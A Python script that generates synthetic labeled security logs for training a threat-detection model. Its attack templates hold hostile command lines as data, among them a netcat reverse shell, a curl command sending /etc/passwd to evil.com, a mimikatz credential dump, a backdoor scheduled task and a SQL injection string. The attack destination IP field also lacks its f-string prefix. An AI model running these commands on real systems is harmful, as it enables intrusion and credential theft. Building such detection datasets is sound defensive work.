#!/usr/bin/env python3
"""
generate-dataset.py
AI-Powered Threat Detection System
Generate labeled dataset from Elasticsearch or synthetic data
"""

import os
import sys
import json
import logging
import argparse
import random
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, Any, List

import pandas as pd

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class DatasetGenerator:
    """Generate labeled dataset for ML training"""
    
    def __init__(self):
        """Initialize dataset generator"""
        self.datasets_dir = Path("lab/datasets")
        self.datasets_dir.mkdir(parents=True, exist_ok=True)
    
    def generate_synthetic_dataset(self, num_records: int = 50000, attack_ratio: float = 0.3) -> pd.DataFrame:
        """Generate synthetic labeled dataset"""
        logger.info(f"Generating synthetic dataset with {num_records} records")
        
        num_attacks = int(num_records * attack_ratio)
        num_benign = num_records - num_attacks
        
        attack_events = self._generate_attack_events(num_attacks)
        benign_events = self._generate_benign_events(num_benign)
        
        df = pd.DataFrame(attack_events + benign_events)
        
        # Shuffle
        df = df.sample(frac=1, random_state=42).reset_index(drop=True)
        
        logger.info(f"Generated {len(df)} records")
        logger.info(f"Attack: {len(df[df['label'] == 'attack'])}")
        logger.info(f"Benign: {len(df[df['label'] == 'benign'])}")
        
        return df
    
    def _generate_attack_events(self, num_attacks: int) -> List[Dict[str, Any]]:
        """Generate attack events"""
        attacks = []
        
        attack_templates = [
            {
                "name": "port_scan",
                "mitre_technique": "T1046",
                "mitre_tactic": "discovery",
                "event_category": "network",
                "source_port": lambda: random.randint(1024, 65535),
                "dest_port": lambda: random.choice([22, 80, 443, 3306, 3389, 445, 8080]),
                "bytes": lambda: random.randint(100, 5000),
                "packets": lambda: random.randint(1, 50)
            },
            {
                "name": "ssh_brute_force",
                "mitre_technique": "T1110",
                "mitre_tactic": "credential_access",
                "event_category": "authentication",
                "source_port": lambda: random.randint(1024, 65535),
                "dest_port": lambda: 22,
                "bytes": lambda: random.randint(100, 2000),
                "packets": lambda: random.randint(1, 20),
                "outcome": "failure"
            },
            {
                "name": "sql_injection",
                "mitre_technique": "T1190",
                "mitre_tactic": "initial_access",
                "event_category": "web",
                "source_port": lambda: random.randint(1024, 65535),
                "dest_port": lambda: 80,
                "bytes": lambda: random.randint(500, 5000),
                "packets": lambda: random.randint(5, 50),
                "command_line": "SELECT * FROM users WHERE username = 'admin' OR '1'='1'"
            },
            {
                "name": "credential_dump",
                "mitre_technique": "T1003",
                "mitre_tactic": "credential_access",
                "event_category": "process",
                "source_port": lambda: 0,
                "dest_port": lambda: 0,
                "bytes": lambda: random.randint(1000, 10000),
                "packets": lambda: random.randint(1, 10),
                "process": "mimikatz.exe",
                "command_line": "mimikatz.exe sekurlsa::logonpasswords"
            },
            {
                "name": "reverse_shell",
                "mitre_technique": "T1059",
                "mitre_tactic": "execution",
                "event_category": "process",
                "source_port": lambda: random.randint(1024, 65535),
                "dest_port": lambda: 4444,
                "bytes": lambda: random.randint(100, 5000),
                "packets": lambda: random.randint(1, 50),
                "process": "nc",
                "command_line": "nc -e /bin/bash 192.168.56.10 4444"
            },
            {
                "name": "data_exfiltration",
                "mitre_technique": "T1048",
                "mitre_tactic": "exfiltration",
                "event_category": "network",
                "source_port": lambda: random.randint(1024, 65535),
                "dest_port": lambda: random.choice([8080, 443, 53]),
                "bytes": lambda: random.randint(5000, 100000),
                "packets": lambda: random.randint(50, 500),
                "command_line": "curl -d @/etc/passwd http://evil.com/exfil"
            },
            {
                "name": "c2_beacon",
                "mitre_technique": "T1071",
                "mitre_tactic": "command_and_control",
                "event_category": "network",
                "source_port": lambda: random.randint(1024, 65535),
                "dest_port": lambda: 443,
                "bytes": lambda: random.randint(100, 10000),
                "packets": lambda: random.randint(1, 100),
                "domain": "evil-c2.com"
            },
            {
                "name": "persistence",
                "mitre_technique": "T1053",
                "mitre_tactic": "persistence",
                "event_category": "process",
                "source_port": lambda: 0,
                "dest_port": lambda: 0,
                "bytes": lambda: random.randint(100, 1000),
                "packets": lambda: random.randint(1, 10),
                "process": "schtasks",
                "command_line": "schtasks /create /tn Backdoor /tr calc.exe /sc onlogon"
            },
            {
                "name": "lateral_movement",
                "mitre_technique": "T1021",
                "mitre_tactic": "lateral_movement",
                "event_category": "network",
                "source_port": lambda: random.randint(1024, 65535),
                "dest_port": lambda: 445,
                "bytes": lambda: random.randint(1000, 50000),
                "packets": lambda: random.randint(10, 500),
                "process": "psexec.exe"
            },
            {
                "name": "webshell",
                "mitre_technique": "T1505",
                "mitre_tactic": "persistence",
                "event_category": "file",
                "source_port": lambda: 0,
                "dest_port": lambda: 0,
                "bytes": lambda: random.randint(100, 10000),
                "packets": lambda: random.randint(1, 10),
                "process": "php",
                "command_line": "php /var/www/html/shell.php",
                "file_name": "shell.php"
            }
        ]
        
        for i in range(num_attacks):
            template = random.choice(attack_templates)
            timestamp = datetime.now() - timedelta(
                seconds=random.randint(0, 7*24*3600)
            )
            
            attack = {
                "@timestamp": timestamp.isoformat(),
                "label": "attack",
                "attack_name": template["name"],
                "mitre_technique": template["mitre_technique"],
                "mitre_tactic": template["mitre_tactic"],
                "event.category": template["event_category"],
                "event.outcome": template.get("outcome", "success"),
                "source.ip": f"192.168.56.{random.randint(1, 10)}",
                "source.port": template["source_port"](),
                "destination.ip": "10.0.0.{random.randint(1, 254)}",
                "destination.port": template["dest_port"](),
                "network.bytes": template["bytes"](),
                "network.packets": template["packets"](),
                "agent.hostname": self._random_hostname(),
                "agent.type": random.choice(["linux", "windows"]),
                "user.name": self._random_username(attack=True),
                "process.pid": random.randint(100, 10000),
                "process.name": template.get("process", random.choice(["bash", "cmd.exe", "powershell.exe", "python3"])),
                "process.command_line": template.get("command_line", ""),
                "file_name": template.get("file_name", ""),
                "domain": template.get("domain", "")
            }
            
            attacks.append(attack)
        
        return attacks
    
    def _generate_benign_events(self, num_benign: int) -> List[Dict[str, Any]]:
        """Generate benign events"""
        events = []
        
        for i in range(num_benign):
            timestamp = datetime.now() - timedelta(
                seconds=random.randint(0, 7*24*3600)
            )
            
            # Random event type
            event_type = random.choices(
                ["authentication", "network", "process", "file"],
                weights=[30, 40, 20, 10]
            )[0]
            
            event = {
                "@timestamp": timestamp.isoformat(),
                "label": "benign",
                "attack_name": "",
                "mitre_technique": "",
                "mitre_tactic": "",
                "event.category": event_type,
                "event.outcome": "success",
                "source.ip": f"192.168.1.{random.randint(1, 254)}",
                "source.port": random.choice([1024, 2048, 3072, 4096, 5000, 8443]),
                "destination.ip": f"10.0.{random.randint(0, 5)}.{random.randint(1, 254)}",
                "destination.port": random.choice([80, 443, 22, 53, 3306]),
                "network.bytes": random.randint(100, 10000),
                "network.packets": random.randint(1, 100),
                "agent.hostname": self._random_hostname(),
                "agent.type": random.choice(["linux", "windows"]),
                "user.name": self._random_username(attack=False),
                "process.pid": random.randint(100, 10000),
                "process.name": random.choice(["chrome.exe", "firefox.exe", "explorer.exe", "apache2", "nginx", "sshd", "systemd"]),
                "process.command_line": random.choice([
                    "chrome.exe --profile-directory=Default",
                    "firefox.exe",
                    "apache2 -DFOREGROUND",
                    "sshd: /usr/sbin/sshd [listener]",
                    "explorer.exe"
                ]),
                "file_name": "",
                "domain": ""
            }
            
            events.append(event)
        
        return events
    
    def _random_hostname(self) -> str:
        """Generate random hostname"""
        prefixes = ["srv", "workstation", "web", "db", "app", "mail", "backup"]
        numbers = [1, 2, 3, 4, 5, 10, 20, 50, 100]
        return f"{random.choice(prefixes)}{random.choice(numbers)}"
    
    def _random_username(self, attack: bool = False) -> str:
        """Generate random username"""
        regular_users = ["john.doe", "jane.smith", "admin", "mark.wilson", "sarah.jones",
                         "mike.brown", "emily.davis", "chris.miller", "lisa.wilson", "david.moore"]
        
        if attack:
            return random.choice(["admin", "root", "administrator", "test", "guest"])
        
        return random.choice(regular_users)
    
    def export_to_elasticsearch(self, df: pd.DataFrame, host: str = "localhost", port: int = 9200):
        """Export dataset to Elasticsearch"""
        try:
            from elasticsearch import Elasticsearch, helpers
            
            es = Elasticsearch(f"http://{host}:{port}")
            
            if not es.ping():
                logger.warning("Could not connect to Elasticsearch")
                return
            
            # Bulk index documents
            docs = [
                {
                    "_index": "attack-simulations",
                    "_source": {
                        **row.to_dict(),
                        "doc_type": "labeled_data"
                    }
                }
                for _, row in df.iterrows()
            ]
            
            success, failed = helpers.bulk(es, docs, chunk_size=1000)
            
            logger.info(f"Exported {success} documents to Elasticsearch")
            
            if failed:
                logger.warning(f"Failed to export {failed} documents")
        
        except ImportError:
            logger.warning("elasticsearch-py not installed, skipping Elasticsearch export")
        except Exception as e:
            logger.error(f"Failed to export to Elasticsearch: {e}")
    
    def save_dataset(self, df: pd.DataFrame, output_name: str = "labeled_logs.csv"):
        """Save dataset to file"""
        output_file = self.datasets_dir / output_name
        df.to_csv(output_file, index=False)
        logger.info(f"Dataset saved to {output_file}")
        
        return output_file


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Generate labeled dataset for ML training')
    parser.add_argument('--records', type=int, default=50000, help='Number of records to generate')
    parser.add_argument('--attack-ratio', type=float, default=0.3, help='Ratio of attack events (0-1)')
    parser.add_argument('--output', default='labeled_logs.csv', help='Output file name')
    parser.add_argument('--export-es', action='store_true', help='Export to Elasticsearch')
    parser.add_argument('--es-host', default='localhost', help='Elasticsearch host')
    parser.add_argument('--es-port', type=int, default=9200, help='Elasticsearch port')
    
    args = parser.parse_args()
    
    generator = DatasetGenerator()
    
    try:
        # Generate dataset
        df = generator.generate_synthetic_dataset(
            num_records=args.records,
            attack_ratio=args.attack_ratio
        )
        
        # Save dataset
        output_file = generator.save_dataset(df, args.output)
        
        # Export to Elasticsearch
        if args.export_es:
            generator.export_to_elasticsearch(
                df,
                host=args.es_host,
                port=args.es_port
            )
        
        # Print summary
        print("\n✅ Dataset generation completed!")
        print(f"Total records: {len(df)}")
        print(f"Attack events: {len(df[df['label'] == 'attack'])} ({len(df[df['label'] == 'attack']) / len(df) * 100:.1f}%)")
        print(f"Benign events: {len(df[df['label'] == 'benign'])} ({len(df[df['label'] == 'benign']) / len(df) * 100:.1f}%)")
        print(f"\nDataset saved to: {output_file}")
        
    except Exception as e:
        logger.error(f"Dataset generation failed: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()